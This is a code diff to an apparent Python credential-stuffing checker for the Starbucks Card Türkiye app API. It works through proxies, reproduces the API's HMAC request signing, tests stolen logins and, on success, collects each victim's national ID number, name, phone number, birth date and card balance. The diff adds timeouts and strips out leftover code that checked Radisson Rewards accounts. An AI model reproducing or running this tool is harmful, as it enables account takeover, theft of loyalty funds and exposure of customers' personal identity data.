@@ -1,3 +1,4 @@
+import traceback
 import requests
 import time
 import json
@@ -19,7 +20,7 @@ def tryLogin(data, proxy):
 	s = requests.session()
 	s.proxies = proxy
 	s.timeout = 5
-	tokenResp = s.post("https://app.starbuckscardturkiye.com/api/v1/request_token", headers=headers, data="{}")
+	tokenResp = s.post("https://app.starbuckscardturkiye.com/api/v1/request_token", headers=headers, data="{}", timeout=5)
 	if tokenResp.status_code != 200:
 		raise ConnectionError
 	request_token = json.loads(tokenResp.text)['request_token']
@@ -28,22 +29,15 @@ def tryLogin(data, proxy):
 	hashresult = hmac.new(jsondata.encode('utf-8'), "POST".encode('utf-8'), hashlib.sha256).hexdigest()
 	hashresult = hmac.new(request_token.encode('utf-8'), hashresult.encode('utf-8'), hashlib.sha256).hexdigest()
 	headers["SB-Signature"] = request_token + ":" + hashresult
-	result = s.post("https://app.starbuckscardturkiye.com/api/v1/login", headers=headers, data=jsondata)
+	result = s.post("https://app.starbuckscardturkiye.com/api/v1/login", headers=headers, data=jsondata, timeout=5)
+
+	if result.status_code == 422:
+		return (False,)
 	if result.status_code != 200:
 		time.sleep(1)
 		raise ConnectionError
 
-	try:
-		data = json.loads(result.text)
-	except:
-		time.sleep(1)
-		raise ConnectionError
-
-	try:
-		if data['errors'][0]['code'] == 107:
-			return (False,)
-	except:
-		pass
+	data = json.loads(result.text)
 
 	if "user" in data and data['user']['is_active']:
 		tckn = data['user']['tckn']
@@ -57,7 +51,7 @@ def tryLogin(data, proxy):
 			stars = data['user']['card']['star']
 
 			try:
-				tokenResp = s.post("https://app.starbuckscardturkiye.com/api/v1/request_token", headers=headers, data="{}")
+				tokenResp = s.post("https://app.starbuckscardturkiye.com/api/v1/request_token", headers=headers, data="{}", timeout=5)
 				if tokenResp.status_code != 200:
 					raise ConnectionError
 				request_token = json.loads(tokenResp.text)['request_token']
@@ -66,7 +60,7 @@ def tryLogin(data, proxy):
 				hashresult = hmac.new(jsondata.encode('utf-8'), "POST".encode('utf-8'), hashlib.sha256).hexdigest()
 				hashresult = hmac.new(request_token.encode('utf-8'), hashresult.encode('utf-8'), hashlib.sha256).hexdigest()
 				headers["SB-Signature"] = request_token + ":" + hashresult
-				cardResp = s.post("https://app.starbuckscardturkiye.com/api/v1/users/{}/card/check_balance".format(userid), headers=headers, data=jsondata)
+				cardResp = s.post("https://app.starbuckscardturkiye.com/api/v1/users/{}/card/check_balance".format(userid), headers=headers, data=jsondata, timeout=5)
 				if cardResp.status_code != 200:
 					raise ConnectionError
 				cardData = json.loads(cardResp.text)
@@ -77,21 +71,4 @@ def tryLogin(data, proxy):
 		else:
 			return (True, "NO CARD, TCKN: {}, First name: {}, Last name: {}, Phone number: {}, Birth date: {}".format(tckn,first_name,last_name,phone_number,birth_date))
 	else:
-		return (False,)
-
-	print(data)
-	return (False,)
-	#if data['is_active']:
-
-
-	try:
-		loginResp.headers['Authorization']
-		try:
-			profiledata = s.get("https://www.radissonhotels.com/en-us/radisson-rewards/secure/my-account", headers=headers, proxies=proxy, timeout=10).text
-			points = profiledata.split('number-points')[1].split('>')[1].split('</')[0].strip()
-			capturedata = "{} points".format(points)
-			return (True, capturedata)
-		except:
-			return (True, "")
-	except:
 		return (False,)
